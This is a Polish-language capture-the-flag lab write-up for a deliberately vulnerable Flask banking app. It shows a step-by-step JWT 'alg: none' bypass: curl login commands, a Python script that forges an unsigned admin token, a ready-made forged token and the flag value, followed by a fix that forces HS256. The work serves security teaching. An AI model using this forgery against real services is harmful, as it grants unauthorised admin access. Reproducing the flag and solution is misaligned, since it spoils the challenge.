# A08 — Software/Data Integrity Failures (JWT None Algorithm)

## Metadane
- **ID:** A08
- **Kategoria:** OWASP A08:2025 - Software or Data Integrity Failures
- **Trudność:** medium
- **Punkty:** 150
- **Flaga:** `PWR{jwt_tampered_admin}` — w odpowiedzi /api/admin/dashboard

## Opis
Flask-JWT-Extended skonfigurowany bez wymuszania algorytmu akceptuje JWT
z `"alg": "none"` — tokeny **bez podpisu kryptograficznego**.
Atakujący może zmodyfikować payload (zmienić `is_admin: false → true`)
i uzyskać dostęp do panelu administratora.

## Exploit krok po kroku

### Krok 1: Zaloguj się jako zwykły user i skopiuj token
```bash
curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"bob@vulnbank.pl","password":"password123"}'
```

Skopiuj wartość pola `token`.

### Krok 2: Stwórz zmodyfikowany JWT w Pythonie
```python
import base64
import json

# Nowy nagłówek — algorytm 'none'
header = {"alg": "none", "typ": "JWT"}
# Nowy payload — is_admin: true
payload = {
    "sub": "2",           # bob's user id
    "is_admin": True,     # zmienione!
    "email": "bob@vulnbank.pl",
    "iat": 9999999999
}

def b64url(data: dict) -> str:
    return base64.urlsafe_b64encode(
        json.dumps(data, separators=(',', ':')).encode()
    ).rstrip(b'=').decode()

fake_token = f"{b64url(header)}.{b64url(payload)}."
print(fake_token)
```

### Krok 3: Wyślij zmodyfikowany token
```bash
FAKE_TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIyIiwiaXNfYWRtaW4iOnRydWUsImVtYWlsIjoiYm9iQHZ1bG5iYW5rLnBsIiwiaWF0Ijo5OTk5OTk5OTk5fQ."

curl -H "Authorization: Bearer $FAKE_TOKEN" \
  http://localhost:5000/api/admin/dashboard
```

Odpowiedź zawiera flagę `PWR{jwt_tampered_admin}`.

## Jak to naprawić
```python
# W konfiguracji JWT wymusz algorytm:
app.config["JWT_ALGORITHM"] = "HS256"
app.config["JWT_DECODE_ALGORITHMS"] = ["HS256"]  # tylko HS256, nie "none"

# Lub przy weryfikacji:
jwt.decode(token, secret, algorithms=["HS256"])  # lista bez "none"
```

## Referencje
- OWASP A08:2025 - Software or Data Integrity Failures
- [CVE-2015-9235 - JWT None Algorithm](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9235)
- [jwt.io](https://jwt.io)
